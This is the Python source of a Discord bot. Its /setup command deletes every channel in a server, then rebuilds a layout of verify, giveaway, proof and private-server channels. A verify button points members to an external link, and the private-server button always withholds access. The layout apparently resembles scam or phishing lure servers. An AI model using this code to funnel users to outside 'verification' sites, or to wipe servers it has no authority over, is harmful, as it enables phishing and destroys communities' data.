import discord
from discord.ext import commands
from discord import app_commands
from flask import Flask
from threading import Thread
import asyncio
import os

# --- CONFIGURATION ---
TOKEN = os.environ.get("DISCORD_TOKEN") # We will set this in Render settings securely
GUILD_ID = 123456789012345678  # REPLACE with your Server ID
VERIFICATION_LINK = "https://your-site.com"

# --- 1. WEB SERVER (For UptimeRobot) ---
app = Flask('')

@app.route('/')
def home():
    return "<b>Bot is Online!</b> 24/7 Service Running."

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- 2. BOT SETUP ---
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

# --- 3. VIEWS (Buttons) ---
class VerifyView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Verify", style=discord.ButtonStyle.blurple, emoji="✅", custom_id="verify_btn")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(f"Proceed to verify: [**Click to Verify**]({VERIFICATION_LINK})", ephemeral=True)

class TicketView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Open Ticket", style=discord.ButtonStyle.gray, emoji="🎟️", custom_id="ticket_btn")
    async def ticket_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Ticket system coming soon!", ephemeral=True)

class PrivateServerView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Access Server", style=discord.ButtonStyle.green, custom_id="ps_btn")
    async def ps_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("❌ You must be verified.", ephemeral=True)

# --- 4. THE NUKE & SETUP COMMAND ---
@bot.tree.command(name="setup", description="⚠️ DANGER: Deletes ALL channels and builds professional layout.")
@app_commands.checks.has_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    await interaction.response.send_message("⚠️ **Starting Server Transformation...**", ephemeral=True)
    guild = interaction.guild

    # A. NUKE (Delete All)
    for channel in guild.channels:
        try: await channel.delete()
        except: pass
        await asyncio.sleep(0.2)

    # B. REBUILD (Professional Layout)
    # Format: "Category": [("Channel Name", "key")]
    layout = {
        "Verify✅": [("Why 𝐕𝐞𝐫𝐢𝐟𝐲✅", "verify"), ("𝐓𝐢𝐜𝐤𝐞𝐭🎟️", "ticket")],
        "Giveaway🔑": [("𝐏𝐫𝐨𝐨𝐟📝", "proof"), ("𝐆𝐢𝐯𝐞𝐚𝐰𝐚𝐲🐉", "giveaway")],
        "Etc Perks": [("𝐩𝐫𝐢𝐯𝐚𝐭𝐞-𝐬𝐞𝐫𝐯𝐞𝐫", "ps")]
    }

    created = {}
    for cat_name, channels in layout.items():
        cat = await guild.create_category(cat_name)
        for name, key in channels:
            c = await guild.create_text_channel(name, category=cat)
            created[key] = c
            await asyncio.sleep(0.5)

    # C. SEND EMBEDS
    if "verify" in created:
        embed = discord.Embed(title="Verification Required", description="Verify to access giveaways and private servers.\n\n**System Status:** 🟢 Online", color=0x9b59b6)
        embed.set_image(url="https://dummyimage.com/600x200/2f004f/fff&text=Verification+System")
        await created["verify"].send(embed=embed, view=VerifyView())
    
    if "ticket" in created:
        embed = discord.Embed(title="Support", description="Open a ticket for help.", color=0x9b59b6)
        await created["ticket"].send(embed=embed, view=TicketView())

    if "ps" in created:
        embed = discord.Embed(title="🎮 Private Server Hub", description="**Exclusive Access**\n⚡ Zero Lag | 🛡️ Safe", color=0x9b59b6)
        await created["ps"].send(embed=embed, view=PrivateServerView())

    print("Setup Complete.")

# --- 5. START ---
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    bot.add_view(VerifyView())
    bot.add_view(TicketView())
    bot.add_view(PrivateServerView())
    await bot.tree.sync()

keep_alive() # Starts Flask Server
bot.run(TOKEN)
        
